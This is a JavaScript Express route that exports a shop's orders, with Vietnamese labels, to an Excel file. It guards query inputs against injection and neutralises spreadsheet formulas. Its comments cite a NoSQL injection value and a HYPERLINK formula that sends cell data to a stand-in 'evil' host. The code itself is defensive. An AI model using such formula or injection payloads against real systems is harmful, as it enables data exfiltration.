const express = require('express');
const ExcelJS = require('exceljs');
const { orders: orderRepo } = require('../../data');
const { formatDate, formatCurrency } = require('../../utils/helpers');
const { asEnum, asString, asDate } = require('../../utils/query-guard');
const router = express.Router();

// Taken from the store rather than hardcoded so the filter follows the status enum.
const ORDER_STATUS_VALUES = orderRepo.STATUS_VALUES;

// The columns a free-text search looks in.
const SEARCH_FIELDS = ['orderCode', 'studentId', 'fullName', 'email'];

/**
 * Helper function to get status text in Vietnamese
 */
function getStatusText(status) {
	const statusMap = {
		'confirmed': 'Đã xác nhận',
		'paid': 'Đã thanh toán',
		'delivered': 'Đã giao hàng',
		'cancelled': 'Đã hủy'
	};
	return statusMap[status] || status;
}

/**
 * Prefix a value that Excel/LibreOffice would interpret as a formula
 * (leading =, +, -, or @) with a single quote so it renders as literal text.
 * `additionalNote` and other free-text order fields are attacker-controlled
 * at order-creation time; without this, opening the export can execute
 * something like =HYPERLINK("http://evil/"&A1,"click").
 */
function sanitizeCell(value) {
	if (typeof value !== 'string') return value;
	return /^[=+\-@]/.test(value) ? `'${value}` : value;
}

/**
 * @route   GET /api/admin/orders/export/excel
 * @desc    Export orders to Excel
 * @access  Private (Admin authentication handled by parent router)
 */
router.get('/excel', async (req, res) => {
	try {
		// Untrusted query input: coerced so a crafted value like
		// status={"$ne":null} can't reshape the query; the repository escapes the
		// search text.
		const status = asEnum(req.query.status, [...ORDER_STATUS_VALUES, 'all']);
		const search = asString(req.query.search);
		const startDate = asDate(req.query.startDate);
		const endDate = asDate(req.query.endDate);

		const orders = await orderRepo.listAll({
			status: status === 'all' ? undefined : status,
			search,
			searchFields: SEARCH_FIELDS,
			createdFrom: startDate,
			createdTo: endDate
		});

		// Create workbook
		const workbook = new ExcelJS.Workbook();
		const worksheet = workbook.addWorksheet('Đơn hàng');

		// Define columns
		worksheet.columns = [
			{ header: 'Mã đơn hàng', key: 'orderCode', width: 15 },
			{ header: 'Mã số sinh viên', key: 'studentId', width: 20 },
			{ header: 'Họ tên', key: 'fullName', width: 25 },
			{ header: 'Email', key: 'email', width: 30 },
			{ header: 'Số điện thoại', key: 'phoneNumber', width: 15 },
			{ header: 'Tổng tiền', key: 'totalAmount', width: 15 },
			{ header: 'Trạng thái', key: 'status', width: 15 },
			{ header: 'Ngày đặt', key: 'createdAt', width: 20 },
			{ header: 'Ngày cập nhật', key: 'statusUpdatedAt', width: 20 },
			{ header: 'Mã giao dịch', key: 'transactionCode', width: 15 },
			{ header: 'Lý do hủy', key: 'cancelReason', width: 30 },
			{ header: 'Ghi chú', key: 'additionalNote', width: 30 },
			{ header: 'Chi tiết sản phẩm', key: 'itemDetails', width: 50 }
		];

		// Style header row
		worksheet.getRow(1).font = { bold: true };
		worksheet.getRow(1).fill = {
			type: 'pattern',
			pattern: 'solid',
			fgColor: { argb: 'FFE3F2FD' }
		};

		// Add data
		orders.forEach(order => {
			const itemDetails = order.items.map(item =>
				`${item.productName} x${item.quantity} = ${formatCurrency(item.price * item.quantity)}`
			).join('\n');

			worksheet.addRow({
				orderCode: order.orderCode,
				studentId: sanitizeCell(order.studentId || ''),
				fullName: sanitizeCell(order.fullName || ''),
				email: sanitizeCell(order.email || ''),
				phoneNumber: sanitizeCell(order.phoneNumber || ''),
				totalAmount: formatCurrency(order.totalAmount),
				status: getStatusText(order.status),
				createdAt: formatDate(order.createdAt),
				statusUpdatedAt: order.statusUpdatedAt ? formatDate(order.statusUpdatedAt) : '',
				transactionCode: sanitizeCell(order.transactionCode || ''),
				cancelReason: sanitizeCell(order.cancelReason || ''),
				additionalNote: sanitizeCell(order.additionalNote || ''),
				itemDetails: sanitizeCell(itemDetails)
			});
		});

		// Generate buffer
		const buffer = await workbook.xlsx.writeBuffer();

		// Set headers for file download
		const filename = `don-hang-${new Date().toISOString().split('T')[0]}.xlsx`;
		res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
		res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

		res.send(buffer);

	} catch (error) {
		console.error('Error exporting orders:', error);
		res.status(500).json({
			success: false,
			message: 'Lỗi server khi xuất file Excel'
		});
	}
});

module.exports = router;
